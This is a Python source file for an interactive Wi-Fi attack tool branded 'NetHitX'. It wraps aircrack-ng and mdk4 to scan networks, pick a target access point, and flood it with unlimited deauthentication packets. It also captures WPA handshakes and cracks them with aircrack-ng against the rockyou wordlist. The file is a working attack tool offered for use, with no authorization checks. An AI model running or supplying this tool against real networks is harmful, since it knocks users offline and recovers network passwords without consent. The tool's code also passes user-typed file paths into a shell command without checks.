import subprocess
import pexpect
import os
import signal
import csv
import sys
import time
import shutil
from colorama import Fore, Style, init
if not 'SUDO_UID' in os.environ.keys():
    print(Fore.RED+Style.BRIGHT+"Try running this program with sudo.")
    exit()



init()
selected_interface = None
selected_mode = None
selected_wifi = None
selected_chanel = None
selected_bssid = None
def check_tool(tool_name):
    return shutil.which(tool_name) is not None
tools_to_check = ['aircrack-ng', 'mdk4', 'xterm']

def install_tool(tool_name):
    input( "\nPress enter to start downloading...wait for it to complete..." + Style.RESET_ALL)
    try:
        yy = f"sudo apt install {tool_name.strip()}"
        subprocess.run(yy.split(), check=True)
    except KeyboardInterrupt:
        sys.exit(0)

    input(Fore.CYAN + "Press enter and restart the script..!!")
    print(Fore.RED + "Quitting...")
    sys.exit(0)
                
def clear_screen():
    # Clear screen based on the operating system
    os.system('cls' if os.name == 'nt' else 'clear')

def effect(text,t = 0.0003):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(t)

def show_banner():
    clear_screen()
    print()
    effect(Fore.RED +  Style.BRIGHT + "=" * 83)
    x =Fore.YELLOW + r"""
|          _____         _                                _                       |
|         |_   _|__  ___| |__  _   _  __      _____  _ __| | _____ _ __           |
|           | |/ _ \/ __| '_ \| | | | \ \ /\ / / _ \| '__| |/ / _ \ '__|          | 
|           | |  __/ (__| | | | |_| |  \ V  V / (_) | |  |   <  __/ |             |
|           |_|\___|\___|_| |_|\__, |   \_/\_/ \___/|_|  |_|\_\___|_|             |
|                              |___/                                              |
|                                                                                 |
"""
    effect(x)
    effect(Fore.RED + "=" * 83)
    x3 = Fore.RED + r"""
|                Author:  R.Shashank kanna                                        |
|                Contact: https://techyworker.com                                 |
"""
    effect(x3)
    effect(Fore.RED + "=" * 83)
    x4 = Fore.YELLOW + r"""
|                        _   _      _   _   _ _ _  __  __                         |
|                       | \ | | ___| |_| | | (_) |_\ \/ /                         |
|                       |  \| |/ _ \ __| |_| | | __|\  /                          |
|                       | |\  |  __/ |_|  _  | | |_ /  \                          |
|                       |_| \_|\___|\__|_| |_|_|\__/_/\_\                         |
|                                                                                 |
"""
    effect(x4)
    effect(Fore.RED + "-" * 83)
    o = True
    tools = ''
    try:
        input(Fore.CYAN + "\nPress Enter to check if the requirements are satisfied...")
    except:
        print(Fore.RED + "Quitting script...")
        sys.exit(0)
    for tool in tools_to_check:
        if check_tool(tool):
            prn = Fore.YELLOW + tool + Fore.GREEN + " is installed\n"
            effect(prn,0.01)
        else:
            o = False
            prn2 = Fore.YELLOW + tool + Fore.RED + " is not installed\n"
            effect(prn2,0.01)
            tools = tools + ' ' + tool
    if o:
        try:
            input(Fore.CYAN + "\nPress Enter to enter into script...")
        except:
            print(Fore.RED + "Quitting script...")
            sys.exit(0)
    else:
        con = input("\nDo you want to install the dependencies..?(y/n): ")
        if con.lower() == 'y':
        	install_tool(tools)
       	else:
            print(Fore.RED + "\nQuitting script...")
            sys.exit(0)
def show_selected_interface():
    print("\n" + Fore.CYAN +  Style.BRIGHT + "Selected Interface:",Fore.YELLOW + selected_interface if selected_interface else Fore.RED +"None")
    print(Fore.CYAN +"Mode:", Fore.YELLOW + selected_mode if selected_mode else Fore.RED +"None")
    print(Fore.CYAN +"ESSID:",Fore.YELLOW + selected_wifi.strip() if selected_wifi else Fore.RED +"None", Fore.CYAN +"\tBSSID:",Fore.YELLOW + selected_bssid if selected_bssid else Fore.RED +"None", Fore.CYAN + "\tChannel:", Fore.YELLOW +selected_chanel.strip() if selected_chanel else Fore.RED +"None")

def select_interface():
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        interfaces = [line.split()[0] for line in result.stdout.split("\n") if "IEEE" in line]

        print(Fore.YELLOW + "\nAvailable Network Interfaces:")
        print("{:<5} {:<15}".format("S.No", "Interface"))
        print("-" * 25)

        for idx, interface in enumerate(interfaces, start=1):
            print("{:<5} {:<15}".format(idx, interface))

        selected_serial = input( Fore.CYAN + "\nEnter the serial number of the interface you want to choose (Ctrl+C to exit): ")

        try:
            global selected_interface
            selected_interface = interfaces[int(selected_serial) - 1]

            # Get and display the mode of the selected interface
            mode_result = subprocess.run(['sudo', 'iwconfig', selected_interface], capture_output=True, text=True)
            modes = [line.split('Mode:')[1].split()[0] for line in mode_result.stdout.split("\n") if 'Mode:' in line]
            global selected_mode
            selected_mode = modes[0] if modes else None

            print(Fore.YELLOW + f"\nYou selected interface {selected_serial}: {selected_interface}")
            return selected_interface

        except (IndexError, ValueError):
            print(Fore.RED + "Invalid serial number. Please choose a valid serial number.")
            pass
            

    except KeyboardInterrupt:
        print(Fore.RED + "\nProgram terminated by user.")
        sys.exit(0)

def set_monitor_mode(interface):
    subprocess.run(['airmon-ng', 'start', interface])
    print(Fore.GREEN + f"Interface {interface} set to monitor mode.")
    if 'mon' not in interface:
        interface += 'mon'
    return interface

def set_managed_mode(interface):
    subprocess.run(['airmon-ng', 'stop', interface])
    print(Fore.GREEN + f"Interface {interface} set to managed mode.")
    if 'mon' in interface:
        interface = interface.replace('mon','')
    return interface

def display_wifi(interface):
    print("\n" + Fore.CYAN + "List 2.4GHz Networks or 5GHz Networks...")
    hz = input("Enter (1) for 2.4GHz and (2) for 5GHz: ")
    print("Enter ONLY 1 OR 2..!")
    if hz == '2':
        command = f"airodump-ng --output-format csv -w wifi {interface} --band a"
        print(Fore.RED + "Listing 5GHz Networks")
    else:
        command = f"airodump-ng --output-format csv -w wifi {interface}"
        print(Fore.RED + "Listing 2.4GHz Networks")
    input(Fore.YELLOW + "\nPress enter to start searching!...Close the pop up to stop the attack.")
    process = pexpect.spawn(f"xterm -title Networks -geometry 100x25-0+0 -e {command}", timeout=None, encoding="utf-8")
    try:
        process.expect(pexpect.EOF)
    except KeyboardInterrupt:
        os.kill(process.pid, signal.SIGINT)
    finally:
        process.close()
    print(Fore.RED + "-" * 62)
    with open("wifi-01.csv", "r") as file:
        r = csv.reader(file)
        xx = 0
        emplist = []
        for row in r:
            try:
                if xx == 0:
                    print(Fore.YELLOW + "{:<5} {:<20} {:<10} {:<5}".format("SNo", row[0], row[3], row[13]))
                else:
                    print(Fore.YELLOW + "{:<5} {:<20} {:<10} {:<5}".format(xx, row[0], row[3], row[13]))
                    aplist = [xx, row[0], row[3], row[13]]
                    emplist.append(aplist)
                xx += 1
            except IndexError:
                pass

    try:
        choice = int(input(Fore.CYAN + "Enter the SNo to select the wifi: "))
        for wifis in emplist:
            if wifis[0] == choice:
                return wifis
    except:
        print(Fore.RED + "Enter valid choice!...")

def deauth(hacknic, hackchannel, hackbssid):
    subprocess.run(["sudo", "airmon-ng", "start", hacknic, hackchannel.strip()])
    command = f"aireplay-ng --deauth 0 -a {hackbssid} {hacknic}"
    print(Fore.YELLOW + "Deauthentication using Aicrack-ng...")
    input( "\nPress enter to start attack!...Close the pop up to stop the attack.")

    process = pexpect.spawn(f"xterm -title Deauthing -e {command}", timeout=None, encoding="utf-8")
    try:
        process.expect(pexpect.EOF)
    except KeyboardInterrupt:
        os.kill(process.pid, signal.SIGINT)
    finally:
        process.close()
    print(Fore.RED + "Deauth Stopped!!!")

def mdk_deauth(hacknic, hackchannel, hackbssid):

    command = f"mdk4 {hacknic} d -c {hackchannel} -B {hackbssid} "
    print(Fore.YELLOW + "Deauthentication using mdk4...")
    input("\nPress enter to start attack!...Close the pop up to stop the attack.")

    process = pexpect.spawn(f"xterm -title Deauthing -e {command}", timeout=None, encoding="utf-8")
    try:
        process.expect(pexpect.EOF)
    except KeyboardInterrupt:
        os.kill(process.pid, signal.SIGINT)
    finally:
        process.close()
    print(Fore.RED + "Deauth Stopped!!!")

def handshake(ssid,interface,channel):
    current_directory = os.getcwd()
    hankshakes_folder = os.path.join(current_directory, "handshakes")
    if not os.path.exists(hankshakes_folder):
        os.makedirs(hankshakes_folder)
    command1 = f"airodump-ng -w handshakes/capture -c {channel} --bssid {ssid} {interface}"
    command2 = f"aireplay-ng --deauth 0 -a {ssid} {interface}"
    print(Fore.YELLOW + "\nCapturing handshake of Network: " + Fore.CYAN +ssid + Fore.YELLOW +" in Channel: " + Fore.CYAN +channel.strip() + Fore.YELLOW +" with Interface: " + Fore.CYAN +interface)
    print(Fore.RED +"2 windows will be created...Make sure you dont close any window unless u see (WPS HANDSHAKE) in Capturing moitor..")
    time.sleep(2)
    input(Fore.YELLOW +"\nPress Enter to start capturing...")
    capturing = pexpect.spawn(f"xterm -title Capturing_Handshake -geometry 100x25-0+0 -e {command1}", timeout=None, encoding="utf-8")
    deauthing = pexpect.spawn(f"xterm -title Deauthing_Network -geometry 100x25-0+350 -e {command2}", timeout=None, encoding="utf-8")

    try:
        capturing.expect(pexpect.EOF)
        deauthing.expect(pexpect.EOF)
    except KeyboardInterrupt:
        os.kill(capturing.pid, signal.SIGINT)
        os.kill(deauthing.pid, signal.SIGINT)
    finally:
        capturing.close()    
        deauthing.close()

def remove_file(f):
    directory_path = os.getcwd()
    files = os.listdir(directory_path)
    for file in files:
        if file.startswith(f):
            file_path = os.path.join(directory_path, file)
            os.remove(file_path)
            print(f"Removed: {file_path}")

def move_file(f):
    current_directory = os.getcwd()
    hankshakes_folder = os.path.join(current_directory, "handshakes")
    if not os.path.exists(hankshakes_folder):
        os.makedirs(hankshakes_folder)
    files = os.listdir(current_directory)
    for file in files:
        if file.startswith(f):
            source_path = os.path.join(current_directory, file)
            destination_path = os.path.join(hankshakes_folder, file)
            shutil.move(source_path, destination_path)
            print(f"Moved: {file} to {hankshakes_folder}")

def run_aircrack(cap_file, wordlist_file):
    command = f"aircrack-ng {cap_file} -w {wordlist_file} "
    try:    
        subprocess.run(command, shell=True)
        print(Fore.RED + "\n Key FOUND !!!" )
    except:
        print("Try Again....ERROR OCCURED..!")
        pass
        
def list_files(folder_path):
    # Get the list of files in the folder
    files = os.listdir(folder_path)

    # Print table header
    print("\n| S.No | File Name")
    print("|------|-----------")

    # Print files with serial numbers
    for i, file_name in enumerate(files, start=1):
        print(f"| {i:4} | {file_name}")

    return files

def get_file_by_sno(folder_path, s_no):
    files = os.listdir(folder_path)
    if 1 <= s_no <= len(files):
        selected_file = files[s_no - 1]
        return "handshakes/"+selected_file
    else:
        return None

def main():
    global selected_interface
    global selected_mode
    global selected_wifi
    global selected_chanel
    global selected_bssid

    show_banner()
    while True:
        clear_screen()
        show_selected_interface()
        print(Fore.RED + "-" * 62)
        print("0. " + "Exit script")
        print("-" * 62)
        print(Fore.YELLOW + "1. " + "Select interface")
        print("2. " + Fore.YELLOW + "Set interface to monitor mode")
        print("3. " + Fore.YELLOW + "Set interface to managed mode")
        print("4. " + Fore.YELLOW + "Select Target network")
        print("-" * 62)
        print(Fore.RED + "5. " + "Deauth selected network")
        print(Fore.RED + "6. " + "Capture Handshake")
        print(Fore.RED + "7. " + "Crack captured Handshake")
        print(Fore.YELLOW + "-" * 62)
        try:
            choice = input(Fore.CYAN + "Enter your choice..: ")
        except KeyboardInterrupt:
            print(Fore.RED + "\nQuitting Script...!")
            break
             
        if choice == '1':
            selected_interface = select_interface()
        elif choice == '2':
            if selected_mode == 'monitor':
                print(Fore.YELLOW + "Interface is already in monitor mode")
            elif selected_interface:
                selected_interface = set_monitor_mode(selected_interface)
                selected_mode = 'Monitor'
            else:
                print(Fore.RED + "Please select an interface first.")
        elif choice == '3':
            if selected_interface:
                selected_interface = set_managed_mode(selected_interface)
                selected_mode = 'Managed'
            else:
                print(Fore.RED + "Please select an interface first.")
        elif choice == '4':
            if selected_interface and selected_mode == 'Monitor':
                try:
                    xxx = display_wifi(selected_interface)
                    selected_wifi = xxx[3]
                    selected_chanel = xxx[2]
                    selected_bssid = xxx[1]
                except:
                    break
                finally:
                    os.remove("wifi-01.csv")
            else:
                print(Fore.RED + "Please select an interface first (or) make sure interface is in monitor mode.")
        elif choice == '0':
            print(Fore.RED + "Quitting Script...!")
            break
        elif choice == '5':
            if selected_interface and selected_wifi and selected_chanel and selected_bssid:
                print(Fore.YELLOW + "Enter '1' for deauth using Aircrack-ng")
                print("Enter '2' for deauth using mdk4")
                try:    
                    n = input(Fore.RED +"Enter choice: ")
                except:
                    pass
                if n == '1':
                    deauth(selected_interface, selected_chanel, selected_bssid)
                elif n == '2':
                    mdk_deauth(selected_interface, selected_chanel, selected_bssid)
                else:
                    print("Enter valid choice...!!!")
                    pass
            else:
                print(Fore.RED + "Please select the wifi to attack.")
        elif choice == '7':
            cp = input(Fore.YELLOW + "Enter path to the Packet capture file: ")
            wp = input("Enter path to the Wordlist....or just press ENTER if u have the default ROCKYOU.TXT wordlist in ((/usr/share/wordlists/rockyou.txt)): " + Fore.YELLOW)
            if wp == '':
                wp = '/usr/share/wordlists/rockyou.txt'
            else:
                pass
            run_aircrack(cp,wp)
        elif choice == '6':
            if selected_interface and selected_wifi and selected_chanel and selected_bssid and selected_mode == 'Monitor':
                handshake(selected_bssid,selected_interface,selected_chanel)
                c = input("Do you want to run BRUTE FORCE ATTACK to captured file?...(y/n): ")
                if c.lower() == 'y':
                    folder_path = "handshakes"
                    list_files(folder_path)
                    selected_sno = int(input("\nEnter the S.No of the file you want to retrieve: "))
                    selected_file = get_file_by_sno(folder_path, selected_sno)
                    if selected_file:
                        print(f"Selected file: {selected_file}")
                        w = input('Enter path to the Wordlist....or just press ENTER if u have the default ROCKYOU.TXT wordlist in ((/usr/share/wordlists/rockyou.txt)): ')
                        if w == '':
                            w = '/usr/share/wordlists/rockyou.txt'
                        else:
                            pass
                        run_aircrack(selected_file,w)
                    else:
                        print("Invalid S.No. Please choose a valid S.No.")
                else:
                    pass 
            else:
                print(Fore.RED +"\nMake sure Wifi Network is selected and Interface in Monitor mode...")
        else:
            print(Fore.RED + "\nInvalid choice. Please enter a number between 1 and 5.")
        print("-" * 62)
        input(Style.RESET_ALL + "\nPress Enter to return to the main menu..." +  Style.BRIGHT )
        

if __name__ == "__main__":
    main()
